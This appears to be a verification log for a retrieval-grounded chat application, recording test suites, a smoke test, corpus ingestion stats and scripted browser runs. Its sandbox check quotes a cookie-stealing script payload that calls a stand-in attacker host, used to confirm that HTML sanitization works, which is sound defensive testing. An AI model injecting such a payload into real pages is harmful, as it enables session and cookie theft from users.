# Verification runs

Evidence used to accept the agent's work. Times are UTC, 2026-09-12.

## Automated tests (backend, Postgres 16 + pgvector 0.6, fake LLM)

```
$ python -m pytest -q
.............................................                            [100%]
46 passed in 17.91s
```

Six consecutive full runs after the shutdown fix: 13.0 s, 12.7 s, 15.8 s, 15.5 s, 12.8 s, 15.5 s — all 45/45.

Test inventory:
- `test_ingest.py` (7): three transcript formats, frontmatter, chunk budget + overlap, long-turn splitting, canonical guest, dedupe.
- `test_units.py` (20): router intents/angles, sanitizer (script/handlers/URLs/CSS/CSP/truncation/markdown), essay checks, RRF fusion, history trimming.
- `test_api_integration.py` (19): … plus the Claude Agent SDK runtime driven end-to-end (real SDK subprocess, in-process MCP tools, fake Messages API); health/readiness/config, structured 422/404, session lifecycle + user metadata, session isolation, grounded SSE stream + persisted citations + deep links, mid-turn tool call, follow-up history, essay → markdown artifact, hostile HTML sanitized on write, markdown artifact route, search endpoint, empty retrieval acknowledged, model timeout persisted, no provider, missing model reason, DB down → 503.

## Smoke test against the running dev stack (fake LLM as "ollama")

```
$ scripts/smoke.sh
1. Liveness
  ✓ GET /health
2. Readiness
     database ok=True episodes=272 chunks=27924 embedded=0
     provider anthropic  available=False model=claude-sonnet-4-5 runtime=agent_sdk  ANTHROPIC_API_KEY not set
     provider ollama     available=True  model=fake-model runtime=messages_loop  
  ✓ GET /health/ready
3. Knowledge base
  ✓ 272 episodes indexed
4. Retrieval
  ✓ search returned 3 lexical
5. Session + grounded chat (streams; may take a minute on a CPU model)
  ✓ session 4bae1cef-19b1-4539-9354-027d43842529
  ✓ provider event
  ✓ citations event
  ✓ streamed tokens
  ✓ done event
6. Persistence
  ✓ messages stored (count, citations) = 2 2
7. Structured errors
  ✓ 404 for unknown session
  ✓ cleanup
All good.
```

## Ingestion of the real corpus

```
ingest_deduped   dropped=31  examples=['alexander-embiricos', 'interview-q-compilation', 'andy-raskin_', 'manik-gupta', 'archie-abrams']
ingest_complete  episodes_seen=303 episodes_new=272 chunks_written=27924   (≈15 s)
```
Lexical search latency on 27,924 chunks: 5–9 ms (`/api/search`).

## Scripted browser runs (Playwright, Chromium)

Desktop 1440×900 and mobile 400×820, driven end-to-end (new chat → grounded answer → essay → HTML artifact → drawer/sheet). Console errors: none after fixes. Screenshots: [`docs/screenshot-desktop.png`](../docs/screenshot-desktop.png), [`docs/screenshot-essay.png`](../docs/screenshot-essay.png), [`docs/screenshot-mobile.png`](../docs/screenshot-mobile.png).

Sandbox check: the fake model's hostile HTML (`<script>fetch('http://evil.example/steal?c='+document.cookie)</script>`, `onclick`, `javascript:` link, `<iframe>`, remote `<img>`, `<form>`) rendered as a styled heading, a paragraph and an inert link; DOM inspection confirmed the `.scrim`/panel stacking and that no script ran.

## Fresh-machine run (Windows 11, Docker Desktop, host Ollama)

_Filled in by hand after the laptop run — see README → "Verified on"._
